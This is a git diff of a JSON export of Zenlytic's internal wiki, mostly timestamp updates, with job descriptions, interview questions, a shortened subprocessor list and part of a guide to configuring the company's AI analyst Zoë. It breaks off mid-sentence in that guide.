@@ -1,5 +1,5 @@
 {
-  "exportedAt": "2026-08-02T03:03:25.466Z",
+  "exportedAt": "2026-09-13T02:08:55.963Z",
   "pages": [
     {
       "id": "dc73011524e54feaa2a69d78d6e5164e",
@@ -11,7 +11,7 @@
         "employee",
         "retention"
       ],
-      "lastUpdated": "2026-08-02T03:01:53.695Z"
+      "lastUpdated": "2026-09-13T02:07:31.557Z"
     },
     {
       "id": "526475ca-69d2-4b67-a4f7-ddf8d8964201",
@@ -26,7 +26,7 @@
         "employee",
         "policy"
       ],
-      "lastUpdated": "2026-08-02T03:01:54.231Z"
+      "lastUpdated": "2026-09-13T02:07:32.028Z"
     },
     {
       "id": "b1cd2254-9c1a-4b0b-945f-13e646221bf0",
@@ -47,7 +47,7 @@
         "policy",
         "firewall"
       ],
-      "lastUpdated": "2026-08-02T03:01:54.889Z"
+      "lastUpdated": "2026-09-13T02:07:32.676Z"
     },
     {
       "id": "5388c71d-8cee-4d62-8be8-972d606690fd",
@@ -59,7 +59,7 @@
         "employee",
         "policy"
       ],
-      "lastUpdated": "2026-08-02T03:01:55.525Z"
+      "lastUpdated": "2026-09-13T02:07:33.275Z"
     },
     {
       "id": "db53fd75-b172-44f9-84eb-e356d718c4ac",
@@ -83,7 +83,7 @@
         "network",
         "logging"
       ],
-      "lastUpdated": "2026-08-02T03:01:56.273Z"
+      "lastUpdated": "2026-09-13T02:07:34.023Z"
     },
     {
       "id": "53107304-c676-4dad-877f-e3dc62b7fe2f",
@@ -105,7 +105,7 @@
         "procedure",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:01:57.376Z"
+      "lastUpdated": "2026-09-13T02:07:35.201Z"
     },
     {
       "id": "519cf166-e30d-44bf-b454-d388ed246e04",
@@ -133,7 +133,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:01:59.240Z"
+      "lastUpdated": "2026-09-13T02:07:37.139Z"
     },
     {
       "id": "cdfb1ee2-0e75-4a98-b2ee-05e323f44433",
@@ -149,7 +149,7 @@
         "policy",
         "procedure"
       ],
-      "lastUpdated": "2026-08-02T03:02:00.795Z"
+      "lastUpdated": "2026-09-13T02:07:38.802Z"
     },
     {
       "id": "1b4a8dad-05ac-803b-a447-fc9262f97f83",
@@ -171,7 +171,7 @@
         "infrastructure",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:02:02.955Z"
+      "lastUpdated": "2026-09-13T02:07:39.677Z"
     },
     {
       "id": "b2654df8-028d-4902-a8cf-93319708fc73",
@@ -196,7 +196,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:02:04.573Z"
+      "lastUpdated": "2026-09-13T02:07:42.198Z"
     },
     {
       "id": "808186e5-ec08-45e9-9539-c798f47ffb15",
@@ -214,7 +214,7 @@
         "procedure",
         "logging"
       ],
-      "lastUpdated": "2026-08-02T03:02:05.800Z"
+      "lastUpdated": "2026-09-13T02:07:43.440Z"
     },
     {
       "id": "2527d98e-ee9c-484a-b665-af3fd881eb66",
@@ -224,7 +224,7 @@
       "keywords": [
         "CC3.3.1"
       ],
-      "lastUpdated": "2026-08-02T03:02:06.477Z"
+      "lastUpdated": "2026-09-13T02:07:44.004Z"
     },
     {
       "id": "2f94af3c-24d2-4fdb-aa54-c6b3515294c1",
@@ -239,7 +239,7 @@
         "background check",
         "procedure"
       ],
-      "lastUpdated": "2026-08-02T03:02:07.104Z"
+      "lastUpdated": "2026-09-13T02:07:44.442Z"
     },
     {
       "id": "612e9f45-4c2c-4b02-b60c-d411f4623e30",
@@ -254,7 +254,7 @@
         "background check",
         "procedure"
       ],
-      "lastUpdated": "2026-08-02T03:02:08.055Z"
+      "lastUpdated": "2026-09-13T02:07:45.261Z"
     },
     {
       "id": "2b2a8dad-05ac-8047-a985-f4f279ca38fa",
@@ -271,7 +271,7 @@
         "procedure",
         "infrastructure"
       ],
-      "lastUpdated": "2026-08-02T03:02:08.947Z"
+      "lastUpdated": "2026-09-13T02:07:46.096Z"
     },
     {
       "id": "fc9d81e4-3f84-40c8-b798-d5018a890134",
@@ -284,7 +284,7 @@
         "policy",
         "procedure"
       ],
-      "lastUpdated": "2026-08-02T03:02:09.931Z"
+      "lastUpdated": "2026-09-13T02:07:47.005Z"
     },
     {
       "id": "ab72611c-4387-40fe-8ab4-f7dcac850c91",
@@ -307,7 +307,7 @@
         "vendor",
         "subprocessor"
       ],
-      "lastUpdated": "2026-08-02T03:02:10.785Z"
+      "lastUpdated": "2026-09-13T02:07:47.742Z"
     },
     {
       "id": "54d40b58-4835-48be-be4d-087df35eed07",
@@ -327,7 +327,7 @@
         "aws",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:02:11.597Z"
+      "lastUpdated": "2026-09-13T02:07:48.487Z"
     },
     {
       "id": "25a4bff1-68be-46a4-a958-5eace6f86ac4",
@@ -347,7 +347,7 @@
         "aws",
         "monitoring"
       ],
-      "lastUpdated": "2026-08-02T03:02:12.387Z"
+      "lastUpdated": "2026-09-13T02:07:49.171Z"
     },
     {
       "id": "df929f14-2b7d-4188-93dd-979ceeee50f8",
@@ -364,7 +364,7 @@
         "procedure",
         "retention"
       ],
-      "lastUpdated": "2026-08-02T03:02:13.177Z"
+      "lastUpdated": "2026-09-13T02:07:49.881Z"
     },
     {
       "id": "21ea8dad-05ac-8094-a02d-e223590bc0b3",
@@ -383,7 +383,7 @@
         "retention",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:02:13.969Z"
+      "lastUpdated": "2026-09-13T02:07:50.551Z"
     },
     {
       "id": "129a8dad-05ac-801c-b803-e69297ecf8c7",
@@ -410,7 +410,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:02:14.915Z"
+      "lastUpdated": "2026-09-13T02:07:51.289Z"
     },
     {
       "id": "29ca8dad-05ac-80f3-9e55-cbb965b5b401",
@@ -424,7 +424,7 @@
         "rpo",
         "rto"
       ],
-      "lastUpdated": "2026-08-02T03:02:15.409Z"
+      "lastUpdated": "2026-09-13T02:07:54.312Z"
     },
     {
       "id": "71ba3e15-d5b5-4e62-a6f2-f3cb07983910",
@@ -434,7 +434,7 @@
       "keywords": [
         "CC1.4.1"
       ],
-      "lastUpdated": "2026-08-02T03:02:16.363Z"
+      "lastUpdated": "2026-09-13T02:07:55.101Z"
     },
     {
       "id": "e62f4f20-ea21-458b-a00f-b23295e468f6",
@@ -444,7 +444,7 @@
       "keywords": [
         "onboarding"
       ],
-      "lastUpdated": "2026-08-02T03:02:16.953Z"
+      "lastUpdated": "2026-09-13T02:07:55.594Z"
     },
     {
       "id": "257a8dad-05ac-807d-a16d-c40911e9b0a7",
@@ -455,7 +455,7 @@
         "onboarding",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:17.654Z"
+      "lastUpdated": "2026-09-13T02:07:56.219Z"
     },
     {
       "id": "e5dfcc09-a3ea-4180-99c6-136a6325f3aa",
@@ -463,7 +463,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "## Job Overview\nZenlytic is an Intelligent Analytics company: we're building the human-first analytics experience.\nOur platform features a strong cognitive layer and a powerful chat agent, Zoë — our helpful assistant powered by large language models (LLMs). Zoë integrates deeply with our semantic layer to provide data insights with unparalleled accuracy to people of all backgrounds, from data analysts to company executives.\nWe’ve built out v1 of Zenlytic’s analytics platform — now we need someone to make it delightful, streamlined, and ridiculously good-looking for two very different types of users. Business leaders want simple, clear answers to big questions. Data analysts want powerful tools that let them dive deep into SQL and modeling. As our UI/UX Designer, you’ll take on the challenge of designing experiences that make both groups feel at home — crafting simplicity where it matters, and surfacing depth where it counts.\nYou’ll own the user experience end-to-end: from wireframes to polished visuals to building a design system that keeps everything cohesive. You’ll work side-by-side with our front-end team (they ship fast!) and help shape features that balance ease-of-use for executives with power and flexibility for analysts.\nIf you love the idea of turning complex workflows into intuitive, elegant experiences — and you get excited about designing for very different user needs in the same product — this is your spot.\n## What You’ll Do\n• Design experiences that work for two audiences: execs who want quick insights and analysts who need depth.\n• Collaborate with product + engineering to layer simplicity on top of powerful features.\n• Create flows, wireframes, prototypes, and polished visuals — including AI-driven chat interfaces for advanced analysis.\n• Build and maintain our design system in Figma for consistency across the product.\n• Run user research and testing with both personas, refining designs based on feedback.\n• Balance usability with flexibility — knowing when to streamline and when to expose advanced tools.\n• Stay sharp on UX best practices, accessibility, and design trends for data-heavy apps.\n## What You’ll Bring\n• A portfolio showing you can design for different users — simple for some, powerful for others.\n• Experience designing SaaS products (bonus if data-heavy or complex).\n• Proficiency in Figma.\n• Strong grasp of information hierarchy, usability, and user-centered design.\n• Comfort with research, design systems, and shipping fast in iterative environments.\n• Detail-oriented problem solver who thrives on ownership.\nBonus Points\n• Familiarity with front-end tech (HTML/CSS/JS).\n• Experience with analytics or BI tools.\n• Knowledge of accessibility and inclusive design.\n• +1 if you love data and analytics.\n• +10 if you’re awesome and fun to work with.\n## Additional Information\nZenlytic is a remote-first company. Team members are free to work from anywhere in the United States. For those who prefer an office environment, we maintain an office in Midtown Manhattan that is available for use.\nVisa Sponsorship: U.S. citizens and those authorized to work in the U.S. are encouraged to apply. Please note that this position is not eligible for visa sponsorship.\nZenlytic is an equal opportunity employer. All qualified applicants will receive consideration for employment regardless of race, color, religion, sex, sexual orientation, gender identity, national origin, disability, or veteran status.",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:18.370Z"
+      "lastUpdated": "2026-09-13T02:07:56.888Z"
     },
     {
       "id": "1e04744c-8d19-4654-b475-0d61ccd115db",
@@ -476,7 +476,7 @@
         "aws",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:19.097Z"
+      "lastUpdated": "2026-09-13T02:07:57.616Z"
     },
     {
       "id": "6e1afd79-40ea-424e-a505-0a02de0c2fbd",
@@ -491,7 +491,7 @@
         "monitoring",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:19.852Z"
+      "lastUpdated": "2026-09-13T02:07:58.249Z"
     },
     {
       "id": "643242aa-ba5f-485a-a9ac-93632f14fcb1",
@@ -504,7 +504,7 @@
         "monitoring",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:20.544Z"
+      "lastUpdated": "2026-09-13T02:07:58.886Z"
     },
     {
       "id": "0eb67d56-4e2d-4f6b-813a-4211173efc76",
@@ -516,7 +516,7 @@
         "infrastructure",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:21.265Z"
+      "lastUpdated": "2026-09-13T02:07:59.522Z"
     },
     {
       "id": "1d1a8dad-05ac-8062-b9b7-d58d407e3574",
@@ -529,7 +529,7 @@
         "infrastructure",
         "monitoring"
       ],
-      "lastUpdated": "2026-08-02T03:02:23.120Z"
+      "lastUpdated": "2026-09-13T02:08:00.107Z"
     },
     {
       "id": "25da8dad-05ac-8001-bfe8-ff19bb0aa0bc",
@@ -537,7 +537,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "## Job Overview\nZenlytic is an Intelligent Analytics company: we're building the human-first analytics experience.\nOur platform features a strong cognitive layer and a powerful chat agent, Zoë — our helpful assistant powered by large language models (LLMs). Zoë integrates deeply with our semantic layer to provide data insights with unparalleled accuracy to people of all backgrounds, from data analysts to company executives.\nWe’re looking for a Software Engineering Intern to develop benchmarks on the performance of LLMs. You will take ownership of the design, implementation, and testing of a system that evaluates how well LLMs convert user input into SQL. You will publish your findings and integrate the code into our existing software repository for general usage.\nThe LLM space is one of the fastest-moving and most exciting frontiers in tech today—and we’re building at that pace. This role is ideal for someone who thrives in high-ownership environments, enjoys both strategic thinking and hands-on coding, and wants to deliver cutting-edge product experiences at the intersection of AI and analytics.\n## What You’ll Do\n• Design and implement an LLM evaluation test suite\n• Measure the performance of several LLMs against the test suite\n## What You’ll Bring\n• Familiarity with LLMs, NLP, and ML concepts (e.g., retrieval-augmented generation, embedding search, agent frameworks).\n• Deep experience with Git, pull requests, and modern collaboration workflows.\n• A self-driven mindset, with the ability to own multiple initiatives simultaneously.\n## Additional Information\nZenlytic is a remote-first company. Team members are free to work from anywhere in the United States. For those who prefer an office environment, we maintain an office in Midtown Manhattan that is available for use.\nVisa Sponsorship: U.S. citizens and those authorized to work in the U.S. are encouraged to apply. Please note that this position is not eligible for visa sponsorship.\nZenlytic is an equal opportunity employer. All qualified applicants will receive consideration for employment regardless of race, color, religion, sex, sexual orientation, gender identity, national origin, disability, or veteran status.",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:23.854Z"
+      "lastUpdated": "2026-09-13T02:08:00.794Z"
     },
     {
       "id": "5fbb2322-5e1e-4511-bc93-4df61c309cdf",
@@ -545,7 +545,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:24.437Z"
+      "lastUpdated": "2026-09-13T02:08:01.330Z"
     },
     {
       "id": "c4dcf450-e0e8-44b9-a40f-f0c13f33f4be",
@@ -555,7 +555,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:24.959Z"
+      "lastUpdated": "2026-09-13T02:08:01.807Z"
     },
     {
       "id": "4cd88e19-4ea2-4549-bab4-974bb12ccd96",
@@ -563,7 +563,7 @@
       "parent": "Growth Lead",
       "content": "• Product-first, bottom-up sales motions: \n• Strong community-based marketing:\n• Content-marketing leaders\n• Leading Shopify technology providers:",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:25.619Z"
+      "lastUpdated": "2026-09-13T02:08:02.471Z"
     },
     {
       "id": "df6e0b27-3198-42d9-8664-af317ec8bd79",
@@ -571,7 +571,7 @@
       "parent": "Growth Lead",
       "content": "---\n• 10/14/20\n• Jonathan Beaton\n---\n## GTM \n• What are you planning for our GTM? What directions would you take us?\n• Most of his experience was with organic motion ",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:26.191Z"
+      "lastUpdated": "2026-09-13T02:08:02.942Z"
     },
     {
       "id": "5cfbb722-dd2b-4552-a259-ea50453cbd69",
@@ -579,7 +579,7 @@
       "parent": "Growth Lead",
       "content": "---\n## Meeting with Viral (8/5/2020)\n• He's the CFO, co-founder\n• He does ops and systems + low code tools \n• They're in growth stage and starting to focus on data\n• historically bringing data into gsheets and now on tableau\n• sync all data in tableau and report there \n---\n## Meeting with Alex (9/25/20)\n• No one person will fit all our needs \n• She'll send us a deck with their model and setup\n• We send them requirements and they'll match us \n• Hourly is $90-170 / hr except for CMO which is higher \n• Part time is locked in 20 hours a week, FT is 40% \n• 20% discount off rate for Part time and Full time ",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:26.776Z"
+      "lastUpdated": "2026-09-13T02:08:03.475Z"
     },
     {
       "id": "09030d3d-835d-42bc-9724-86d0a968e7de",
@@ -587,7 +587,7 @@
       "parent": "Growth Lead",
       "content": "- What would you do to launch Zenlytic?\nuse U-link to reach out\n- What do you think of the PLG model?\n- What's a marketing-driven company you respect?  How would you explain their marketing strategy?\n- How do you keep up with the industry?  What's your favorite email newsletter?\n- What are the most important components of an inbound strategy?\n- How have you used data before in your job?  What tools have you used?\n- What do you do for fun outside of work?\n- What brands or influencers do you follow on social media and why?",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:27.412Z"
+      "lastUpdated": "2026-09-13T02:08:04.064Z"
     },
     {
       "id": "c2fec5dc-b6b6-4ec1-b9b5-c3c312b32439",
@@ -595,7 +595,7 @@
       "parent": "Growth Lead",
       "content": "- What would you do to launch Zenlytic?\n- What do you think of the PLG model?\n- What's a marketing-driven company you respect?  How would you explain their marketing strategy?\n- How do you keep up with the industry?  What's your favorite email newsletter?\n- What are the most important components of an inbound strategy?\n- How have you used data before in your job?  What tools have you used?\n- What do you do for fun outside of work?\n- What brands or influencers do you follow on social media and why?",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:28.115Z"
+      "lastUpdated": "2026-09-13T02:08:06.565Z"
     },
     {
       "id": "ef147748-77aa-4049-92ec-d8d5978bc0d1",
@@ -608,7 +608,7 @@
         "aws",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:28.964Z"
+      "lastUpdated": "2026-09-13T02:08:07.377Z"
     },
     {
       "id": "1b4a8dad-05ac-8032-b5ce-c63f100dcabe",
@@ -618,7 +618,7 @@
       "keywords": [
         "infrastructure"
       ],
-      "lastUpdated": "2026-08-02T03:02:31.203Z"
+      "lastUpdated": "2026-09-13T02:08:08.100Z"
     },
     {
       "id": "add41806-bd72-4418-835a-d7a337fc0b36",
@@ -628,7 +628,7 @@
       "keywords": [
         "retention"
       ],
-      "lastUpdated": "2026-08-02T03:02:31.891Z"
+      "lastUpdated": "2026-09-13T02:08:08.748Z"
     },
     {
       "id": "1195ed70-a8b2-47cf-a34d-5894f200e66e",
@@ -639,7 +639,7 @@
         "rpo",
         "network"
       ],
-      "lastUpdated": "2026-08-02T03:02:32.637Z"
+      "lastUpdated": "2026-09-13T02:08:09.427Z"
     },
     {
       "id": "92da9569-6340-4865-be2a-7677164c5d1c",
@@ -650,7 +650,7 @@
         "onboarding",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:33.502Z"
+      "lastUpdated": "2026-09-13T02:08:10.096Z"
     },
     {
       "id": "1eaa8dad-05ac-80d0-9b92-c2ba45a52272",
@@ -664,7 +664,7 @@
         "vendor",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:34.161Z"
+      "lastUpdated": "2026-09-13T02:08:10.772Z"
     },
     {
       "id": "25ba8dad-05ac-801b-9928-e40a3d182470",
@@ -672,7 +672,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "- What product or feature have you built from scratch that you're most proud of? \n- What product or feature have you worked on with the most demanding performance, scalability, latency, or memory requirements? Please describe these requirements.\n- What is the most complex application you've ever worked on? What specific factors made it complex?\n- Describe a technically challenging problem you solved that surprised you. Was it unexpectedly difficult or simple? Did you develop an elegant solution? Or did you build a very convoluted solution and later realized that there was a much simpler solution.",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:34.742Z"
+      "lastUpdated": "2026-09-13T02:08:11.325Z"
     },
     {
       "id": "1d0a8dad-05ac-80af-89e7-e100d0956aae",
@@ -682,7 +682,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:35.297Z"
+      "lastUpdated": "2026-09-13T02:08:11.815Z"
     },
     {
       "id": "1d1a8dad-05ac-807a-b46f-f343f6f4c20f",
@@ -692,7 +692,7 @@
       "keywords": [
         "infrastructure"
       ],
-      "lastUpdated": "2026-08-02T03:02:35.830Z"
+      "lastUpdated": "2026-09-13T02:08:12.313Z"
     },
     {
       "id": "1d1a8dad-05ac-80a8-8389-c938d2709bb8",
@@ -700,7 +700,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "- Please describe the product or major feature that you are most proud of being the driving force behind.\n- What SaaS product out there do you think offers the most incredible user experience? What about it inspires you?\n- What do you think is the biggest thing that ChatGPT’s interface gets wrong?",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:36.389Z"
+      "lastUpdated": "2026-09-13T02:08:12.795Z"
     },
     {
       "id": "2aef0fb0-71ef-4ba9-806b-881051c8c20a",
@@ -711,7 +711,7 @@
         "employee",
         "policy"
       ],
-      "lastUpdated": "2026-08-02T03:02:37.163Z"
+      "lastUpdated": "2026-09-13T02:08:13.523Z"
     },
     {
       "id": "c63ab33c-0bc4-4aa9-98f3-fa81d7100850",
@@ -723,7 +723,7 @@
         "sso",
         "aws"
       ],
-      "lastUpdated": "2026-08-02T03:02:37.616Z"
+      "lastUpdated": "2026-09-13T02:08:13.969Z"
     },
     {
       "id": "a35e336a-5a92-4fba-9ac4-8a75d7872412",
@@ -742,7 +742,7 @@
         "aws",
         "logging"
       ],
-      "lastUpdated": "2026-08-02T03:02:38.547Z"
+      "lastUpdated": "2026-09-13T02:08:14.825Z"
     },
     {
       "id": "1325e189-2105-452d-b6f3-68f3b197ccf1",
@@ -755,7 +755,7 @@
         "onboarding",
         "aws"
       ],
-      "lastUpdated": "2026-08-02T03:02:39.256Z"
+      "lastUpdated": "2026-09-13T02:08:15.497Z"
     },
     {
       "id": "ac94c667-0af3-4bad-a023-ba0ce979ebff",
@@ -771,7 +771,7 @@
         "aws",
         "third party"
       ],
-      "lastUpdated": "2026-08-02T03:02:40.558Z"
+      "lastUpdated": "2026-09-13T02:08:16.329Z"
     },
     {
       "id": "1595fdb6-a46a-482e-9dcc-65fd98831020",
@@ -783,7 +783,7 @@
         "compliance",
         "audit"
       ],
-      "lastUpdated": "2026-08-02T03:02:41.458Z"
+      "lastUpdated": "2026-09-13T02:08:16.922Z"
     },
     {
       "id": "8230df19-ee1e-4f6f-b0c1-00518e41d5bb",
@@ -816,7 +816,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:02:42.353Z"
+      "lastUpdated": "2026-09-13T02:08:17.758Z"
     },
     {
       "id": "25ca8dad-05ac-80d9-a716-c2461db6a795",
@@ -829,7 +829,7 @@
         "incident",
         "onboarding"
       ],
-      "lastUpdated": "2026-08-02T03:02:43.197Z"
+      "lastUpdated": "2026-09-13T02:08:18.495Z"
     },
     {
       "id": "25ca8dad-05ac-805b-85a7-f7269be86e66",
@@ -844,7 +844,7 @@
         "onboarding",
         "aws"
       ],
-      "lastUpdated": "2026-08-02T03:02:43.702Z"
+      "lastUpdated": "2026-09-13T02:08:18.999Z"
     },
     {
       "id": "6b8833be227a437a8f846f9cd5c896e4",
@@ -859,7 +859,7 @@
         "retention",
         "network"
       ],
-      "lastUpdated": "2026-08-02T03:02:44.797Z"
+      "lastUpdated": "2026-09-13T02:08:19.988Z"
     },
     {
       "id": "3eb14fe0-7e8d-400f-8082-a5af44c29a0a",
@@ -876,7 +876,7 @@
         "logging",
         "monitoring"
       ],
-      "lastUpdated": "2026-08-02T03:02:45.288Z"
+      "lastUpdated": "2026-09-13T02:08:20.409Z"
     },
     {
       "id": "36fa8dad-05ac-81a7-85a6-cfb6090cbcb4",
@@ -889,7 +889,7 @@
         "retention",
         "logging"
       ],
-      "lastUpdated": "2026-08-02T03:02:45.881Z"
+      "lastUpdated": "2026-09-13T02:08:23.365Z"
     },
     {
       "id": "fd9bdf97-ab8c-4543-8810-2a70c312458c",
@@ -900,7 +900,7 @@
         "privacy",
         "policy"
       ],
-      "lastUpdated": "2026-08-02T03:02:46.428Z"
+      "lastUpdated": "2026-09-13T02:08:23.890Z"
     },
     {
       "id": "482e1430-de5b-4c9f-8788-f3dce778af63",
@@ -908,18 +908,18 @@
       "parent": "Security Homepage",
       "content": "This is the link to our EULA / ToS ",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:47.123Z"
+      "lastUpdated": "2026-09-13T02:08:24.419Z"
     },
     {
       "id": "028b3458-f905-4410-91db-39db87ff955f",
       "title": "Subprocessors",
       "parent": "Security Homepage",
-      "content": "These are the subprocessors we use: \n• Amazon Web Services (Cloud provider)\n• Azure (Cloud provider)\n• Algolia (Search index)\n• OpenAI (LLM Provider)\n• Langfuse (developer logs)\n• LogRocket (developer logs)\n• Sentry (developer logs)\n• Segment (internal analytics)\n• Snowflake (internal analytics)\n• Airbyte (internal analytics)",
+      "content": "These are the subprocessors we use",
       "keywords": [
         "sso",
         "subprocessor"
       ],
-      "lastUpdated": "2026-08-02T03:02:47.707Z"
+      "lastUpdated": "2026-09-13T02:08:24.864Z"
     },
     {
       "id": "216a8dad-05ac-8053-86f9-f85f9cdf8363",
@@ -927,7 +927,7 @@
       "parent": "Security Homepage",
       "content": "",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:48.271Z"
+      "lastUpdated": "2026-09-13T02:08:25.340Z"
     },
     {
       "id": "180a8dad-05ac-80a1-bccf-da1558df31ed",
@@ -938,7 +938,7 @@
         "audit",
         "rpo"
       ],
-      "lastUpdated": "2026-08-02T03:02:49.347Z"
+      "lastUpdated": "2026-09-13T02:08:25.901Z"
     },
     {
       "id": "a64dc864-7a02-468c-85f4-6c91bb6fc122",
@@ -946,7 +946,7 @@
       "parent": "Security Homepage",
       "content": "# Without Clarity (link)\n# With Clarity (link)\n# With Clarity - Deep questions (link)",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:49.982Z"
+      "lastUpdated": "2026-09-13T02:08:26.513Z"
     },
     {
       "id": "b1172bf4-7337-4ac6-8996-593a99253586",
@@ -962,7 +962,7 @@
         "policy",
         "aws"
       ],
-      "lastUpdated": "2026-08-02T03:02:51.018Z"
+      "lastUpdated": "2026-09-13T02:08:27.273Z"
     },
     {
       "id": "326a8dad-05ac-80e9-b828-c696be3d3e85",
@@ -972,18 +972,18 @@
       "keywords": [
         "security"
       ],
-      "lastUpdated": "2026-08-02T03:02:51.669Z"
+      "lastUpdated": "2026-09-13T02:08:27.945Z"
     },
     {
       "id": "3f72c85f50d947ec97543db5242260f9",
       "title": "Engineering Wiki",
       "parent": "root",
-      "content": "> 👋 Welcome to Zenlytic’s Engineering team! Our mission is to design, build, and maintain Zenlytic’s core product and features in support of our product vision.\nIf you don’t know where to start, start with Getting Started. For most things you’re looking for, you can safely ignore the Policies and Security sections. \n## Technology Vision & Roadmap\n## External \n---\nData Retention Policies \n---\n## VPC Deployment\n---",
+      "content": "> 👋 Welcome to Zenlytic’s Engineering team! Our mission is to design, build, and maintain Zenlytic’s core product and features in support of our product vision.\nIf you don’t know where to start, start with Getting Started. For most things you’re looking for, you can safely ignore the Policies and Security sections. \n## Technology Vision & Roadmap\n## External \n---\nData Retention Policies \n---\n## VPC Deployment\n---\n## Product Features\n---",
       "keywords": [
         "security",
         "retention"
       ],
-      "lastUpdated": "2026-08-02T03:02:52.534Z"
+      "lastUpdated": "2026-09-13T02:08:28.611Z"
     },
     {
       "id": "c61320a6-760b-4a63-9f69-170b7a64b471",
@@ -991,7 +991,7 @@
       "parent": "Engineering Wiki",
       "content": "## Cloud Architecture\n---\n## Chat (Zoë) Architecture\n---\n## Component Architecture\nOriginal (Excalidraw)",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:53.043Z"
+      "lastUpdated": "2026-09-13T02:08:29.109Z"
     },
     {
       "id": "1bca8dad-05ac-808c-8170-ebe970188c55",
@@ -999,7 +999,7 @@
       "parent": "Architecture Diagram",
       "content": "- SEARCH_FIELDS_TOOL\n- QUERY_DATA_TOOL (referred to as DataQuestion in the code)\n- CHART_CONFIG_TOOL\n- SEARCH_DASHBOARDS_TOOL\n- CREATE_NEW_DASHBOARD_TOOL\n- ADD_QUESTIONS_TO_DASHBOARD_TOOL\n- SHOW_VIEWS_TOOL\n- CODE_INTERPRETER_TOOL\n- CREATE_FIELD_TOOL\n- USER_INTERACTION_MEMORY_TOOL\n- REASONING_TOOL\n- CAUSAL_IMPACT_ANALYZER_TOOL",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:53.494Z"
+      "lastUpdated": "2026-09-13T02:08:29.552Z"
     },
     {
       "id": "209a8dad-05ac-80e0-bd3d-c1504eed9633",
@@ -1015,7 +1015,7 @@
         "api",
         "integration"
       ],
-      "lastUpdated": "2026-08-02T03:02:54.834Z"
+      "lastUpdated": "2026-09-13T02:08:30.437Z"
     },
     {
       "id": "209a8dad-05ac-80e7-a300-dd017988985c",
@@ -1028,7 +1028,7 @@
         "infrastructure",
         "network"
       ],
-      "lastUpdated": "2026-08-02T03:02:56.915Z"
+      "lastUpdated": "2026-09-13T02:08:31.297Z"
     },
     {
       "id": "207a8dad-05ac-803f-88b7-f07f1f7dcc79",
@@ -1041,7 +1041,7 @@
         "infrastructure",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:02:58.334Z"
+      "lastUpdated": "2026-09-13T02:08:32.807Z"
     },
     {
       "id": "356a8dad-05ac-8047-a376-d4cc8ceed873",
@@ -1049,7 +1049,7 @@
       "parent": "Engineering Wiki",
       "content": "This is the checklist for new features. This applies to net-new features that will impact the customer experience, not to bug fixes or very minor enhancements. \n• CX communication\n• Rollout Strategy\n• Marketing Communication (if applicable)\n• Docs\n• Test Plan (message in #development if you are unsure about any of these)\n• Are there DB migrations? \n• Blast radius",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:02:59.828Z"
+      "lastUpdated": "2026-09-13T02:08:33.996Z"
     },
     {
       "id": "b5eb4f7a-c7eb-4a45-bc35-0bcd9931dc4b",
@@ -1059,7 +1059,7 @@
       "keywords": [
         "integration"
       ],
-      "lastUpdated": "2026-08-02T03:03:00.508Z"
+      "lastUpdated": "2026-09-13T02:08:34.611Z"
     },
     {
       "id": "22675636-cd8c-4e73-a45f-d065f158db5e",
@@ -1071,7 +1071,7 @@
         "sso",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:01.480Z"
+      "lastUpdated": "2026-09-13T02:08:35.493Z"
     },
     {
       "id": "d828bc4b-c1f3-4c61-8b4a-5a82b0887983",
@@ -1079,7 +1079,7 @@
       "parent": "Engineering Wiki",
       "content": "In this document, we’ll cover how to use the extra prompt context feature when setting up Zoë, Zenlytic’s AI analyst.\n---\n# What instructions does Zoë already have?\nWhen adding new context for Zoë, you should try not to repeat or contradict instructions she is given in the Zenlytic-set system prompt. \nThese are the high-level instructions we give Zoë by default when you interact with her:\n• You are Zenlytic's self-serve Business Intelligence (BI) assistant deployed in a chat interface.\n• You operate on the company's semantic layer.\n• You are assisting the company: <your-company-name> and the current date is <current-date>\n• Clarify ambiguous questions with follow-up questions.\nDon't change these instructions when adding additional context for Zoë because doing so will confuse Zoë and hurt her performance.\n# How should I add instructions?\nWhen structuring additional instructions for Zoë, make sure they are clearly written and contain a straightforward action Zoë should follow. \nA good heuristic is: \n> If a human was skimming this, would they still get the point and do what I’m asking?\nGenerally, it’s helpful to emphasize certain points to 